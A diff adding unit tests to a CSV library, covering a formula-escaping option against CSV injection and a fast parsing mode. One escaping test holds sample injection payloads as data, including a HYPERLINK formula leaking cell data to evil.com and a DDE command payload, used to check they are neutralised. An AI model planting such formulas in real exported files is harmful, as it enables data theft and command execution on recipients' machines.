@@ -1920,6 +1920,319 @@ describe("CSV Core - Formatter Options", () => {
   });
 
   // ===========================================================================
+  // escapeFormulae option (CSV Injection prevention)
+  // ===========================================================================
+  describe("escapeFormulae option", () => {
+    it("should not escape by default", () => {
+      const result = formatCsv([["=SUM(A1:A10)"]], { includeEndRowDelimiter: false });
+      expect(result).toBe("=SUM(A1:A10)");
+    });
+
+    it("should escape fields starting with =", () => {
+      const result = formatCsv([["=SUM(A1:A10)"]], {
+        escapeFormulae: true,
+        includeEndRowDelimiter: false
+      });
+      // Tab prefix is added to prevent formula execution
+      expect(result).toBe("\t=SUM(A1:A10)");
+    });
+
+    it("should escape fields starting with +", () => {
+      const result = formatCsv([["+1234567890"]], {
+        escapeFormulae: true,
+        includeEndRowDelimiter: false
+      });
+      expect(result).toBe("\t+1234567890");
+    });
+
+    it("should escape fields starting with -", () => {
+      const result = formatCsv([["-100"]], {
+        escapeFormulae: true,
+        includeEndRowDelimiter: false
+      });
+      expect(result).toBe("\t-100");
+    });
+
+    it("should escape fields starting with @", () => {
+      const result = formatCsv([["@username"]], {
+        escapeFormulae: true,
+        includeEndRowDelimiter: false
+      });
+      expect(result).toBe("\t@username");
+    });
+
+    it("should escape fields starting with tab", () => {
+      const result = formatCsv([["\tindented"]], {
+        escapeFormulae: true,
+        includeEndRowDelimiter: false
+      });
+      // Tab is added as prefix to already-tab-prefixed field
+      expect(result).toBe("\t\tindented");
+    });
+
+    it("should not escape normal values", () => {
+      const result = formatCsv([["hello", "world", "123"]], {
+        escapeFormulae: true,
+        includeEndRowDelimiter: false
+      });
+      expect(result).toBe("hello,world,123");
+    });
+
+    it("should handle real CSV injection attack patterns", () => {
+      const maliciousData = [
+        ["Name", "Formula"],
+        ["Innocent", '=HYPERLINK("http://evil.com?data="&A1,"Click")'],
+        ["Test", "@SUM(A1:A100)"],
+        ["Data", "+cmd|' /C calc'!A0"]
+      ];
+      const result = formatCsv(maliciousData, {
+        escapeFormulae: true,
+        includeEndRowDelimiter: false
+      });
+
+      // Normal values should not be escaped
+      expect(result).toContain("Name,Formula");
+      expect(result).toContain("Innocent");
+
+      // Malicious patterns should be prefixed with tab
+      expect(result).toContain("\t=HYPERLINK");
+      expect(result).toContain("\t@SUM");
+      expect(result).toContain("\t+cmd");
+    });
+
+    it("should work with streaming formatter", async () => {
+      const { CsvFormatterStream } = await import("@csv/csv-stream");
+      const formatter = new CsvFormatterStream({
+        escapeFormulae: true
+      });
+
+      const chunks: string[] = [];
+      formatter.on("data", (chunk: string) => chunks.push(chunk));
+
+      formatter.write(["=FORMULA", "safe"]);
+      formatter.end();
+
+      await new Promise(resolve => formatter.on("finish", resolve));
+      const output = chunks.join("");
+      expect(output).toContain("\t=FORMULA");
+      expect(output).toContain("safe");
+    });
+  });
+
+  // ===========================================================================
+  // fastMode option (Performance optimization for simple data)
+  // ===========================================================================
+  describe("fastMode option", () => {
+    it("should parse simple CSV correctly", () => {
+      const csv = "a,b,c\n1,2,3\n4,5,6";
+      const result = parseCsv(csv, { fastMode: true });
+      expect(result).toEqual([
+        ["a", "b", "c"],
+        ["1", "2", "3"],
+        ["4", "5", "6"]
+      ]);
+    });
+
+    it("should parse with headers", () => {
+      const csv = "name,age,city\nAlice,30,NYC\nBob,25,LA";
+      const result = parseCsv(csv, { fastMode: true, headers: true }) as any;
+      expect(result.headers).toEqual(["name", "age", "city"]);
+      expect(result.rows).toEqual([
+        { name: "Alice", age: "30", city: "NYC" },
+        { name: "Bob", age: "25", city: "LA" }
+      ]);
+    });
+
+    it("should handle CRLF line endings", () => {
+      const csv = "a,b\r\n1,2\r\n3,4";
+      const result = parseCsv(csv, { fastMode: true });
+      expect(result).toEqual([
+        ["a", "b"],
+        ["1", "2"],
+        ["3", "4"]
+      ]);
+    });
+
+    it("should handle CR only line endings", () => {
+      const csv = "a,b\r1,2\r3,4";
+      const result = parseCsv(csv, { fastMode: true });
+      expect(result).toEqual([
+        ["a", "b"],
+        ["1", "2"],
+        ["3", "4"]
+      ]);
+    });
+
+    it("should skip empty lines when configured", () => {
+      const csv = "a,b\n\n1,2\n\n3,4";
+      const result = parseCsv(csv, { fastMode: true, skipEmptyLines: true });
+      expect(result).toEqual([
+        ["a", "b"],
+        ["1", "2"],
+        ["3", "4"]
+      ]);
+    });
+
+    it("should skip comment lines", () => {
+      const csv = "a,b\n# comment\n1,2\n3,4";
+      const result = parseCsv(csv, { fastMode: true, comment: "#" });
+      expect(result).toEqual([
+        ["a", "b"],
+        ["1", "2"],
+        ["3", "4"]
+      ]);
+    });
+
+    it("should respect maxRows", () => {
+      const csv = "a,b\n1,2\n3,4\n5,6\n7,8";
+      const result = parseCsv(csv, { fastMode: true, headers: true, maxRows: 2 }) as any;
+      expect(result.rows).toHaveLength(2);
+      expect(result.rows[0]).toEqual({ a: "1", b: "2" });
+      expect(result.rows[1]).toEqual({ a: "3", b: "4" });
+    });
+
+    it("should trim fields when configured", () => {
+      const csv = " a , b \n 1 , 2 ";
+      const result = parseCsv(csv, { fastMode: true, trim: true });
+      expect(result).toEqual([
+        ["a", "b"],
+        ["1", "2"]
+      ]);
+    });
+
+    it("should respect skipLines", () => {
+      const csv = "skip this\nand this\na,b\n1,2";
+      const result = parseCsv(csv, { fastMode: true, skipLines: 2 });
+      expect(result).toEqual([
+        ["a", "b"],
+        ["1", "2"]
+      ]);
+    });
+
+    it("should work with custom delimiter", () => {
+      const csv = "a;b;c\n1;2;3";
+      const result = parseCsv(csv, { fastMode: true, delimiter: ";" });
+      expect(result).toEqual([
+        ["a", "b", "c"],
+        ["1", "2", "3"]
+      ]);
+    });
+
+    it("should apply transform function", () => {
+      const csv = "name,value\ntest,123";
+      const result = parseCsv(csv, {
+        fastMode: true,
+        headers: true,
+        transform: (row: any) => ({ ...row, name: row.name.toUpperCase() })
+      }) as any;
+      expect(result.rows[0].name).toBe("TEST");
+    });
+
+    it("should apply validate function", () => {
+      const csv = "name,age\nAlice,30\nBob,15\nCharlie,25";
+      const result = parseCsv(csv, {
+        fastMode: true,
+        headers: true,
+        validate: (row: any) => parseInt(row.age) >= 18
+      }) as any;
+      expect(result.rows).toHaveLength(2);
+      expect(result.rows.map((r: any) => r.name)).toEqual(["Alice", "Charlie"]);
+    });
+
+    it("should apply validate function returning object with reason", () => {
+      const csv = "name,age\nAlice,30\nBob,15\nCharlie,25";
+      const result = parseCsv(csv, {
+        fastMode: true,
+        headers: true,
+        validate: (row: any) => {
+          const age = parseInt(row.age);
+          return age >= 18
+            ? { isValid: true }
+            : { isValid: false, reason: `Age ${age} is under 18` };
+        }
+      }) as any;
+      expect(result.rows).toHaveLength(2);
+      expect(result.invalidRows).toHaveLength(1);
+      expect(result.invalidRows[0].reason).toBe("Age 15 is under 18");
+    });
+
+    it("should handle validate in array mode", () => {
+      const csv = "1,2\n3,4\n5,6";
+      const result = parseCsv(csv, {
+        fastMode: true,
+        validate: (row: string[]) => parseInt(row[0]) > 2
+      }) as any;
+      expect(result.rows).toEqual([
+        ["3", "4"],
+        ["5", "6"]
+      ]);
+      expect(result.invalidRows).toHaveLength(1);
+      expect(result.invalidRows[0].row).toEqual(["1", "2"]);
+    });
+
+    it("should handle validate in array mode with object return", () => {
+      const csv = "1,2\n3,4";
+      const result = parseCsv(csv, {
+        fastMode: true,
+        validate: (row: string[]) =>
+          parseInt(row[0]) > 2
+            ? { isValid: true }
+            : { isValid: false, reason: "First value too small" }
+      }) as any;
+      expect(result.rows).toEqual([["3", "4"]]);
+      expect(result.invalidRows[0].reason).toBe("First value too small");
+    });
+
+    it("should handle numeric data (typical fastMode use case)", () => {
+      // Sensor data - no quotes needed
+      const csv =
+        "timestamp,sensor1,sensor2,sensor3\n1705924800,23.5,45.2,78.9\n1705924860,23.6,45.1,79.0";
+      const result = parseCsv(csv, { fastMode: true, headers: true }) as any;
+      expect(result.rows).toHaveLength(2);
+      expect(result.rows[0].sensor1).toBe("23.5");
+    });
+
+    it("should work with streaming parser", async () => {
+      const { CsvParserStream } = await import("@csv/csv-stream");
+      const parser = new CsvParserStream({ fastMode: true });
+
+      const rows: any[] = [];
+      parser.on("data", row => rows.push(row));
+
+      parser.write("a,b,c\n");
+      parser.write("1,2,3\n");
+      parser.write("4,5,6\n");
+      parser.end();
+
+      await new Promise(resolve => parser.on("finish", resolve));
+      expect(rows).toEqual([
+        ["a", "b", "c"],
+        ["1", "2", "3"],
+        ["4", "5", "6"]
+      ]);
+    });
+
+    it("should work with streaming parser and headers", async () => {
+      const { CsvParserStream } = await import("@csv/csv-stream");
+      const parser = new CsvParserStream({ fastMode: true, headers: true });
+
+      const rows: any[] = [];
+      parser.on("data", row => rows.push(row));
+
+      parser.write("name,value\n");
+      parser.write("test1,100\n");
+      parser.write("test2,200\n");
+      parser.end();
+
+      await new Promise(resolve => parser.on("finish", resolve));
+      expect(rows).toEqual([
+        { name: "test1", value: "100" },
+        { name: "test2", value: "200" }
+      ]);
+    });
+  });
+
+  // ===========================================================================
   // BOM handling
   // ===========================================================================
   describe("BOM handling", () => {
